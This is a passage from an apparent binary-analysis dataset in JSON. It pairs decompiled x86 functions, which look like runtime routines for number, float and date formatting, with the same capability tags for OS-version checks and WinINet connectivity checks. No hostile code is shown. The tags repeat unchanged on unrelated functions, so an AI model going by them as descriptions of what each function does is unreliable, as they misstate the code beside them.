pcVar3 = extraout_ECX;\n    if (cVar2 != ':') goto code_r0x0040ac1a;\n    if (in_ECX == extraout_ECX) goto code_r0x0040af0f;\n    pcVar7 = in_ECX + 1;\n    cVar1 = *in_ECX;\n    goto code_r0x0040abfb;\ncode_r0x0040ac1a:\n    pcVar5 = extraout_EDX;\n    if (cVar2 == '.') {\n        if (in_ECX == extraout_ECX) goto code_r0x0040af0f;\n        in_ECX = in_ECX + 1;\n        fcn.0040ac8a(unaff_EDI, unaff_ESI);\n        pcVar3 = extraout_ECX_00;\n        pcVar5 = extraout_EDX_00;\n    }\n    fcn.0040acd2(pcVar5, pcVar3);\n    pcVar7 = pcVar4 + -extraout_ECX_01;\n    if (pcVar4 < extraout_ECX_01) {\n        pcVar7 = NULL;\n    }\n    pcVar4 = extraout_ECX_01;\n    pcVar8 = in_ECX;\n    if (cVar1 == '-') {\n        bVar9 = pcVar5 < extraout_ECX_01;\n        pcVar5 = pcVar5 + -extraout_ECX_01;\n        if (bVar9) {\n            pcVar4 = extraout_ECX_01 + pcVar5;\n            pcVar5 = NULL;\n        }\n        for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n            *in_EAX = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    pcVar6 = pcVar5 + -pcVar7;\n    if (pcVar5 < pcVar7) {\n        pcVar7 = pcVar7 + pcVar6;\n        pcVar6 = NULL;\n    }\n    for (; pcVar7 != NULL; pcVar7 = pcVar7 + -1) {\n        *in_EAX = ' ';\n        in_EAX = in_EAX + 1;\n    }\n    in_EDX = pcVar6 - pcVar4;\n    if (pcVar6 < pcVar4) {\n        pcVar4 = pcVar4 + in_EDX;\n        in_EDX = 0;\n    }\n    for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n        *in_EAX = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    goto code_r0x0040abd1;\n}\n",
        "token_count": 1196
    },
    "0040ac8a": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ac8a(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t in_AL;\n    uint8_t *in_ECX;\n    int32_t unaff_EBP;\n    uint8_t *unaff_ESI;\n    uint var_ch;\n    uint var_8h;\n    \n    if (in_AL == 0x2a) {\n        if (*(unaff_EBP + -0xc) <= *(unaff_EBP + 8)) {\n            *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n        }\n        if (unaff_ESI == in_ECX) {\ncode_r0x0040af0f:\n            fcn.0040aeff();\n            return;\n        }\n    }\n    else {\n        while ((0x2f < in_AL && (in_AL < 0x3a))) {\n            if (unaff_ESI == in_ECX) goto code_r0x0040af0f;\n            in_AL = *unaff_ESI;\n            unaff_ESI = unaff_ESI + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "0040b0d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040b0d4(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uchar *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char in_CL;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint var_2ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = 0x13;\n    if (in_CL == '\\0') {\n        iVar1 = arg_ch;\n        if (arg_ch < 2) {\n            iVar1 = 2;\n        }\n        if (0x12 < iVar1) {\n            iVar1 = 0x12;\n        }\n    }\n    uVar2 = 9999;\n    if (1 < arg_10h) {\n        uVar2 = arg_8h;\n    }\n    fcn.0040b3a8(uVar2, iVar1);\n    puVar5 = in_EAX;\n    if (var_2ch - 0x7fff < 2) {\n        fcn.0040b1d3();\n        puVar4 = extraout_ECX * 3 + 0x40b1c4;\n        for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        uVar3 = arg_10h;\n        if ((arg_10h != 1) && ((4 < arg_10h || (iVar1 < var_2ch)))) {\n            uVar3 = 0;\n        }\n        (**(uVar3 * 4 + 0x40b1b0))();\n    }\n    return puVar5 - in_EAX;\n}\n",
        "token_count": 455
    },
    "0040b1d3": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040b1d3(void)\n\n{\n    int32_t unaff_EBP;\n    uchar *unaff_EDI;\n    uint var_2ah;\n    \n    if (*(unaff_EBP + -0x2a) != '\\0') {\n        *unaff_EDI = 0x2d;\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "0040b3a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b3a8(char param_1)\n\n{\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint var_4h;\n    \n    if (param_1 == '\\0') {\n        fcn.0040b3d5(unaff_EBX, unaff_ESI);\n    }\n    else {\n        fcn.0040b4f7(unaff_EBX);\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0040b3d5": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b3d5(uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    float10 fVar2;\n    int16_t *piVar3;\n    ushort uVar4;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    uint8_t uVar8;\n    int32_t iVar7;\n    ushort *unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int16_t *piVar9;\n    float10 fVar10;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(unaff_ESI + 2);\n    uVar5 = uVar6 & 0x7fff;\n    if ((uVar6 & 0x7fff) == 0) {\ncode_r0x0040b400:\n        uVar6 = 0;\n    }\n    else {\n        if (uVar5 != 0x7fff) {\n            *(unaff_EBP + -8) = ((uVar5 - 0x3fff) * 0x4d10 >> 0x10) + 1;\n            fVar10 = fcn.00404124();\n            fVar10 = ROUND(fVar10);\n            fVar2 = *(*(unaff_EBP + -4) + 0x492880);\n            *(unaff_EBP + -10) = (fVar2 < fVar10) << 8 | (fVar2 == fVar10) << 0xe;\n            if ((*(unaff_EBP + -10) & 0x4100) != 0) {\n                fVar10 = fVar10 / *(*(unaff_EBP + -4) + 0x49288c);\n                *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n            }\n            *(unaff_EBP + -0x18) = fVar10;\n            iVar7 = 9;\n            piVar9 = unaff_EBX + 3;\n            do {\n                uVar8 = *(iVar7 + -0x19 + unaff_EBP);\n                piVar3 = piVar9 + 1;\n                *piVar9 = (CONCAT11(uVar8, uVar8 >> 4) & 0xfff) + 0x3030;\n                iVar7 = iVar7 + -1;\n                piVar9 = piVar3;\n            } while (iVar7 != 0);\n            *piVar3 = 0;\n            uVar5 = *(unaff_EBP + -8) + *(unaff_EBP + 8);\n            if (uVar5 < 0) {\n                uVar5 = 0;\n                goto code_r0x0040b400;\n            }\n            if (*(unaff_EBP + 0xc) <= uVar5) {\n                uVar5 = *(unaff_EBP + 0xc);\n            }\n            if (uVar5 < 0x12) {\n                if (*(unaff_EBX + uVar5 + 3) < 0x35) goto code_r0x0040b4c2;\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        *(unaff_EBX + 3) = 0x31;\n                        *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n                        break;\n                    }\n                    pcVar1 = unaff_EBX + uVar5 + 2;\n                    *pcVar1 = *pcVar1 + '\\x01';\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (0x39 < *(unaff_EBX + iVar7));\n            }\n            else {\n                uVar5 = 0x12;\ncode_r0x0040b4c2:\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        uVar8 = 0;\n                        goto code_r0x0040b4d5;\n                    }\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (*(unaff_EBX + iVar7) == '0');\n            }\n            uVar8 = *(unaff_ESI + 2) >> 8;\ncode_r0x0040b4d5:\n            uVar4 = *(unaff_EBP + -8);\n            goto code_r0x0040b4d8;\n        }\n        if (((*(unaff_ESI + 6) & 0x8000) != 0) && ((*unaff_ESI != 0 || (unaff_ESI[1] != -0x80000000)))) {\n            uVar5 = 0x8000;\n            goto code_r0x0040b400;\n        }\n    }\n    uVar8 = uVar6 >> 8;\n    uVar4 = uVar5;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040b4d8:\n    *unaff_EBX = uVar4;\n    *(unaff_EBX + 1) = uVar8 >> 7;\n    return;\n}\n",
        "token_count": 1192
    },
    "0040b5d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b5d4(uint param_1, float10 *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    ushort extraout_var;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    uint16_t in_FPUStatusWord;\n    uint16_t uVar5;\n    float10 fVar6;\n    uint16_t uVar7;\n    uint var_4h;\n    \n    uVar2 = *0x49880f;\n    uVar5 = (in_FPUStatusWord >> 8 & 0x7f) << 8;\n    fcn.0040b68b();\n    uVar1 = *in_EAX;\n    uVar7 = uVar1;\n    if ((uVar1 == 0x2b) || (uVar1 == 0x2d)) {\n        in_EAX = in_EAX + 1;\n    }\n    fcn.0040b696();\n    iVar4 = 0;\n    puVar3 = extraout_ECX;\n    if (*in_EAX == uVar2) {\n        in_EAX = in_EAX + 1;\n        fcn.0040b696();\n        iVar4 = -extraout_EDX;\n        puVar3 = extraout_ECX_00;\n    }\n    if (puVar3 != in_EAX) {\n        if ((*in_EAX & 0xdf) == 0x45) {\n            in_EAX = in_EAX + 1;\n            fcn.0040b6b2(iVar4);\n        }\n        fcn.0040b68b();\n        if (*in_EAX == 0) {\n            fVar6 = fcn.00404124();\n            if (uVar7 >> 8 == '-') {\n                fVar6 = -fVar6;\n            }\n            if (uVar7 == '\\0') {\n                *param_2 = fVar6;\n            }\n            else {\n                *param_2 = ROUND(fVar6);\n            }\n            if ((uVar5 & 9) == 0) {\n                return CONCAT31(CONCAT22(extraout_var, uVar5) >> 8, 1);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 537
    },
    "0040be3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be3c(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x13) == '\\0') {\n        fcn.0040bbe8(*(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x13) = 1;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0040be74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be74(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x1d) == '\\0') {\n        fcn.0040b908(arg_8h + -0x1c, *(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x1d) = 1;\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0040c148": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c148(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    uint8_t *in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1eh;\n    int16_t var_1ah;\n    int16_t var_18h;\n    uint16_t var_16h;\n    uint var_13h;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    uStack68 = 0x40c8cc;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    if ((in_EAX != NULL) && (*(arg_8h + -0x108) < 2)) {\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + 1;\n        var_1eh._0_1_ = 0x20;\n        var_4h = in_EAX;\n        while (*var_4h != 0) {\n            uVar1 = *var_4h;\n            if ((*((uVar1 >> 3) + 0x492828) >> (uVar1 & 7) & 1) == 0) {\n                var_4h = fcn.0040e778();\n                uVar6 = uVar1;\n                if (uVar1 + 0x9f < 0x1a) {\n                    uVar6 = uVar1 - 0x20;\n                }\n                uVar3 = var_1eh;\n                if (((uVar6 + 0xbf < 0x1a) && (uVar3 = uVar6,  uVar6 == 0x4d)) && (var_1eh == 0x48)) {\n                    uVar6 = 0x4e;\n                    uVar3 = uVar6;\n                }\n                var_1eh._0_1_ = uVar3;\n    // switch table (57 cases) at 0x40c269\n                switch(uVar6) {\n                case 0x22:\n                case 0x27:\n                    while ((*var_4h != 0 && (*var_4h != uVar1))) {\n                        if ((*((*var_4h >> 3) + 0x492828) >> (*var_4h & 7) & 1) == 0) {\n                            var_4h = var_4h + 1;\n                        }\n                        else {\n                            var_4h = fcn.0040e778();\n                        }\n                    }\n                    fcn.0040bd64(arg_8h);\n                    if (*var_4h != 0) {\n                        var_4h = var_4h + 1;\n                    }\n                    break;\n                default:\n                    fcn.0040bd64(arg_8h);\n                    break;\n                case 0x2f:\n                    if (*0x498811 != '\\0') {\n                        fcn.0040bd64(arg_8h);\n                    }\n                    break;\n                case 0x3a:\n                    if (*0x49881c != '\\0') {\n                        fcn.0040bd64(arg_8h);\n                    }\n                    break;\n                case 0x41:\n                    fcn.0040be74(&stack0xfffffffc);\n                    iVar5 = fcn.0040aa04();\n                    if (iVar5 == 0) {\n                        fcn.0040bd64(arg_8h);\n                        var_4h = var_4h + 4;\n                    }\n                    else {\n                        iVar5 = fcn.0040aa04();\n                        if (iVar5 == 0) {\n                            fcn.0040bd64(arg_8h);\n                            var_4h = var_4h + 2;\n                        }\n                        else {\n                            iVar5 = fcn.0040aa04();\n                            if (iVar5 == 0) {\n                                if (var_16h < 0xc) {\n                                    fcn.0040bda8(arg_8h);\n                                }\n                                else {\n                                    fcn.0040bda8(arg_8h);\n                                }\n                                var_4h = var_4h + 3;\n                            }\n                            else {\n                                iVar5 = fcn.0040aa04();\n                                if (iVar5 == 0) {\n                                    fcn.0040be3c(&stack0xfffffffc);\n                                    uVar7 = *(arg_8h + 8);\n                                    fcn.0040bc78(uVar7, *(arg_8h + 0xc));\n                                    fcn.0040bda8(uVar7);\n                                    var_4h = var_4h + 3;\n                                }\n                                else {\n                                    iVar5 = fcn.0040aa04();\n                                    if (iVar5 == 0) {\n                                        fcn.0040be3c(&stack0xfffffffc);\n                                        uVar7 = *(arg_8h + 8);\n                                        fcn.0040bc78(uVar7, *(arg_8h + 0xc));\n                                        fcn.0040bda8(uVar7);\n                                        var_4h = var_4h + 2;\n                                    }\n                                    else {\n                                        fcn.0040bd64(arg_8h);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    break;\n                case 0x43:\n                    fcn.0040be10(&stack0xfffffffc);\n                    fcn.0040c148(arg_8h);\n                    fcn.0040be74(&stack0xfffffffc);\n                    if (((var_16h != 0) || (var_18h != 0)) || (var_1ah != 0)) {\n                        fcn.0040bd64(arg_8h);\n                        fcn.0040c148(arg_8h);\n                    }\n                    break;\n                case 0x44:\n                    fcn.0040be10(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040be3c(&stack0xfffffffc);\n                        fcn.0040bdc4(arg_8h);\n                    }\n                    else if (var_ch == 3) {\n                        uVar7 = *(arg_8h + 8);\n                        fcn.0040bc78(uVar7, *(arg_8h + 0xc));\n                        fcn.0040bda8(uVar7);\n                    }\n                    else if (var_ch == 4) {\n                        uVar7 = *(arg_8h + 8);\n                        fcn.0040bc78(uVar7, *(arg_8h + 0xc));\n                        fcn.0040bda8(uVar7);\n                    }\n                    else if (var_ch == 5) {\n                        fcn.0040c148(arg_8h);\n                    }\n                    else {\n                        fcn.0040c148(arg_8h);\n                    }\n                    break;\n                case 0x45:\n                    fcn.0040be10(&stack0xfffffffc);\n                    fcn.0040be3c(&stack0xfffffffc);\n                    iVar5 = arg_8h;\n                    fcn.0040c030(&stack0xfffffffc);\n                    fcn.0040bda8(iVar5);\n                    break;\n                case 0x47:\n                    fcn.0040be10(&stack0xfffffffc);\n                    fcn.0040be3c(&stack0xfffffffc);\n                    iVar5 = arg_8h;\n                    fcn.0040beb4(&stack0xfffffffc);\n                    fcn.0040bda8(iVar5);\n                    break;\n                case 0x48:\n                    fcn.0040be10(&stack0xfffffffc);\n                    fcn.0040be74(&stack0xfffffffc);\n                    bVar2 = false;\n                    puVar4 = var_4h;\n                    while (*puVar4 != 0) {\n                        if ((*((*puVar4 >> 3) + 0x492828) >> (*puVar4 & 7) & 1) == 0) {\n                            uVar1 = *puVar4;\n                            if (uVar1 < 0x49) {\n                                if (uVar1 == 0x48) break;\n                                if ((uVar1 == 0x22) || (uVar1 == 0x27)) {\n                                    bVar2 = bVar2 ^ 1;\n                                }\n                                else if (uVar1 == 0x41) goto code_r0x0040c4be;\n                            }\n                            else if (uVar1 == 0x61) {\ncode_r0x0040c4be:\n                                if (!bVar2) {\n                                    iVar5 = fcn.0040aa04();\n                                    if ((iVar5 != 0) && (iVar5 = fcn.0040aa04(),  iVar5 != 0)) {\n                                        fcn.0040aa04();\n                                    }\n                                    break;\n                                }\n                            }\n                            else if (uVar1 == 0x68) break;\n                            puVar4 = puVar4 + 1;\n                        }\n                        else {\n                            puVar4 = fcn.0040e778();\n                        }\n                    }\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bdc4(arg_8h);\n                    break;\n                case 0x4d:\n                    fcn.0040be10(&stack0xfffffffc);\n                    fcn.0040be3c(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040bdc4(arg_8h);\n                    }\n                    else if (var_ch - 1U == 2) {\n                        fcn.0040bda8(arg_8h);\n                    }\n                    else {\n                        fcn.0040bda8(arg_8h);\n                    }\n                    break;\n                case 0x4e:\n                    fcn.0040be10(&stack0xfffffffc);\n                    fcn.0040be74(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bdc4(arg_8h);\n                    break;\n                case 0x53:\n                    fcn.0040be10(&stack0xfffffffc);\n                    fcn.0040be74(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bdc4(arg_8h);\n                    break;\n                case 0x54:\n                    fcn.0040be10(&stack0xfffffffc);\n                    if (var_ch == 1) {\n                        fcn.0040c148(arg_8h);\n                    }\n                    else {\n                        fcn.0040c148(arg_8h);\n                    }\n                    break;\n                case 0x59:\n                    fcn.0040be10(&stack0xfffffffc);\n                    fcn.0040be3c(&stack0xfffffffc);\n                    if (var_ch < 3) {\n                        fcn.0040bdc4(arg_8h);\n                    }\n                    else {\n                        fcn.0040bdc4(arg_8h);\n                    }\n                    break;\n                case 0x5a:\n                    fcn.0040be10(&stack0xfffffffc);\n                    fcn.0040be74(&stack0xfffffffc);\n                    if (3 < var_ch) {\n                        var_ch = 3;\n                    }\n                    fcn.0040bdc4(arg_8h);\n                }\n            }\n            else {\n                iVar5 = arg_8h;\n                fcn.0040e758();\n                fcn.0040bd64(iVar5);\n                var_4h = fcn.0040e778();\n                var_1eh._0_1_ = 0x20;\n            }\n        }\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + -1;\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x40c8d3;\n    uStack68 = 0x40c8cb;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2765
    },
    "0040cbbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040cbbc(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint uStack20;\n    \n    uStack20 = 0;\n    iVar5 = 7;\n    piVar3 = 0x4988d8;\n    puVar4 = 0x4988f4;\n    do {\n        if (*piVar3 == 0) break;\n        uVar1 = fcn.004059dc();\n        fcn.004059dc(uVar1);\n        iVar2 = fcn.0040e9a0();\n        if (iVar2 != 0) {\n            uStack20 = *puVar4;\n            break;\n        }\n        puVar4 = puVar4 + 1;\n        piVar3 = piVar3 + 1;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    return CONCAT44(uStack20, uStack20);\n}\n",
        "token_count": 230
    },
    "0040cc10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040cc10(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (*0x4988cc == 0x12) {\n        if (in_EAX < 100) {\n            uVar1 = fcn.0040bd50();\n            uVar2 = *(arg_8h + -4) >> 0x1f;\n            in_EAX = in_EAX + (((uVar1 & 0xffff) + ((*(arg_8h + -4) ^ uVar2) - uVar2)) / 100) * 100;\n        }\n        if (0 < *(arg_8h + -4)) {\n            *(arg_8h + -4) = -*(arg_8h + -4);\n        }\n    }\n    else {\n        *(arg_8h + -4) = *(arg_8h + -4) + -1;\n    }\n    return *(arg_8h + -4) + in_EAX;\n}\n",
        "token_count": 242
    },
    "0040cc6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040cc6c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    ushort var_18h;\n    uint var_16h;\n    ushort var_12h;\n    ushort var_10h;\n    char var_eh;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_20h = 0;\n    var_8h = 0;\n    uStack64 = 0x40cf8e;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_16h._0_2_ = 0;\n    var_18h = 0;\n    var_1ch._0_1_ = 0;\n    var_dh = 0;\n    var_eh = fcn.0040cb28();\n    var_4h = 0;\n    if (**0x498814 == 'g') {\n        fcn.0040cb74();\n        fcn.00405a44(&fcn.0040cc6c::var_20h);\n        fcn.00409b84();\n        var_4h = fcn.0040cbbc();\n    }\n    else {\n        iVar2 = fcn.0040e8d4();\n        if (0 < iVar2) {\n            var_4h = *0x4988f4;\n        }\n    }\n    cVar1 = fcn.0040c980(&fcn.0040cc6c::var_1ch + 3);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.0040caec(),  cVar1 != '\\0')) {\n        in_stack_ffffffac = 0x40cd5a;\n        cVar1 = fcn.0040c980(&fcn.0040cc6c::var_1ch + 2);\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0040caec();\n            if (cVar1 == '\\0') {\n                fcn.0040bd50();\n                if (var_eh == '\\x01') {\n                    var_18h = var_10h;\n                    var_16h._0_2_ = var_12h;\n                }\n                else {\n                    var_16h._0_2_ = var_10h;\n                    var_18h = var_12h;\n                }\n            }\n            else {\n                in_stack_ffffffac = &fcn.0040cc6c::var_1ch + 1;\n                cVar1 = fcn.0040c980(in_stack_ffffffac);\n                if (cVar1 == '\\0') goto code_r0x0040cf6b;\n                if (var_eh == '\\0') {\n                    var_1ch._0_1_ = var_1ch._1_1_;\n                    var_16h._0_2_ = var_10h;\n                    var_18h = var_12h;\n                }\n                else if (var_eh == '\\x01') {\n                    var_1ch._0_1_ = var_1ch._1_1_;\n                    var_16h._0_2_ = var_12h;\n                    var_18h = var_10h;\n                }\n                else if (var_eh == '\\x02') {\n                    var_1ch._0_1_ = var_1ch._3_1_;\n                    var_16h._0_2_ = var_12h;\n                    var_18h = var_16h._2_2_;\n                }\n                if (var_4h < 1) {\n                    if (var_1ch < 3) {\n                        fcn.0040bd50();\n                    }\n                }\n                else {\n                    fcn.0040cc10(&stack0xfffffffc);\n                }\n            }\n            fcn.0040caec();\n            fcn.0040c95c();\n            if ((*0x4988d4 != '\\0') && (iVar2 = fcn.00405b28(),  iVar2 != 0)) {\n                if (**0x498828 - 0x30U < 10) {\n                    fcn.0040cb74();\n                }\n                else {\n                    do {\n                        while ((iVar2 = fcn.0040580c(),  *param_2 <= iVar2 && (*(in_EAX + -1 + *param_2) != ' '))) {\n                            *param_2 = *param_2 + 1;\n                        }\n                        fcn.0040c95c();\n                        iVar2 = fcn.0040580c();\n                        if (iVar2 < *param_2) break;\n                        fcn.0040580c();\n                        fcn.00405a44();\n                        iVar2 = fcn.00409b20();\n                        if (iVar2 == 0) break;\n                        fcn.0040580c();\n                        fcn.00405a44();\n                        iVar2 = fcn.00409b20();\n                    } while (iVar2 != 0);\n                }\n            }\n            var_dh = fcn.0040b9a0(var_ch);\n            in_stack_ffffffac = var_ch;\n        }\n    }\ncode_r0x0040cf6b:\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00405554(0x40cf95);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1313
    },
    "0040cfb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
